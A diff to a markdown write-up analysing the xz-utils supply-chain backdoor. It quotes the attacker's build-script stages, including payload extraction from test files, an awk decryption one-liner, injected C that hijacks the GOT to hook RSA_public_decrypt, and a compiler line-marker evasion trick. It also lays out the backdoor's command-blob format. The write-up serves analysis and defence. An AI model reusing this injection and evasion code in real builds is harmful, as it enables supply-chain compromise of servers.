@@ -200,10 +200,10 @@ vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2>/dev/null`
 
 Then we extract the backdoor from `good-large_compressed.lzma`, perform some sort of decryption/cipher, then perform another decompression. 
 I added linebreaks to make it more legible. This results in a .o file that can mess with  function called `RSA_public_decrypt`. 
-This will be important later.
+This will be important later. This was determined from the work in [this writeup](https://research.swtch.com/xz-script).
 
 ```bash
-xz -dc $top_srcdir/tests/files/$p | \
+`xz -dc $top_srcdir/tests/files/$p | \
 eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | \
 LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | \
 xz -dc --single-stream | \
@@ -221,7 +221,8 @@ This backdoor takes advantage of that small window when the GOT is editable by c
 The code works by hijacking crc64_fast.c's already present resolver and having it call `_is_arch_extension_supported` rather than `is_arch_extension_supported`. 
 This results in it calling `_get_cpuid` rather than `get_cpuid`. 
 That `_get_cpuid` ends up editing the GOT tables which allows it to hijack RSA_public_decrypt. 
-These files are compiled together to result in the final `.libs/liblzma_la-crc64_fast.o` which is dynamically linked into other projects at which point it hijacks the GOT tables. 
+These files are compiled together to result in the final `.libs/liblzma_la-crc64_fast.o` which is dynamically linked into other projects at which point it hijacks the GOT tables.
+We do not have much experience with C build systems so we had to rely on [the same writeup](https://research.swtch.com/xz-script) to get started with our analysis
 
 ```bash
 V='#endif\n#if defined(CRC32_GENERIC) && defined(CRC64_GENERIC) && defined(CRC_X86_CLMUL) && defined(CRC_USE_IFUNC) && defined(PIC) && (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\nextern int _get_cpuid(int, void*, void*, void*, void*, void*);\nstatic inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4]; success = _get_cpuid(1, &r[0], &r[1], &r[2], &r[3], ((char*) __builtin_frame_address(0))-16); const uint32_t ecx_mask = (1 << 1) | (1 << 9) | (1 << 19); return success && (r[2] & ecx_mask) == ecx_mask; }\n#else\n#define _is_arch_extension_supported is_arch_extension_supported'
@@ -232,11 +233,46 @@ sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
 $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2>/dev/null; then
 ```
 
+I would not have discovered this without the writeup, but there's another neat bit of evasion going on here. 
+We are compiling the modified c code from stdin so the compiler will report an unusual thing being compiled.
+So the attacker added this `# 0 "src/liblzma/check/crc64_fast.c"` to the file which is a macro telling the compiler to report that as the file that was compiled. Woah!
+
+```bash
+sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2>/dev/null | \
+```
+
 # The Backdoor
+
+As expected, the backdoor itself is also thoughtfully crafted.
+Naively, you would think this backdoor works by allowing the attacker who has a certain private key ssh access. 
+However, this would result in the SSH activity being logged 
+Thus once a dillagent admin sees malicous activity on their server combined with a ssh login for a key that isn't in authorized_keys they may piece together that sshd itself has been compromised. 
+
+The backdoor works by pretneding to do RSA authenticaton.
+However the attacker does not send a legitimate RSA key.
+Instead they send an encrypted ED448 signed cipher text which fits within the 256-512 byte RSA key field.
+
+ChaCha20 encrypted blob:
 
 ```
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|                    signature (114 bytes)                      |
+|   a (32 bit)  |   b (32 bit)  |           c (64 bit)          |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                                                               |
++                     ciphertext (240 bytes)                    +
+|                                                               |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+```
+[source](https://github.com/amlweems/xzbot)
+
+The ChaCha20 encrypted blob can be decrypted by using a, b, c as the key which also is the first half of the ED448 key. 
+According to the author, a, b, and c are also used to determine whether of not to execute the command portion of the blob below.
+
+Decrypted blob:
+
+```
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                    ED448 signature (114 bytes)                |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 | x (1 bit) |            unused ? (14 bit)          | y (1 bit) |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -245,6 +281,7 @@ $CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS 
 |        unknown (8 bit)        |         command \x00          |
 +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
+[source](https://github.com/amlweems/xzbot)
 
 # Consequences
 
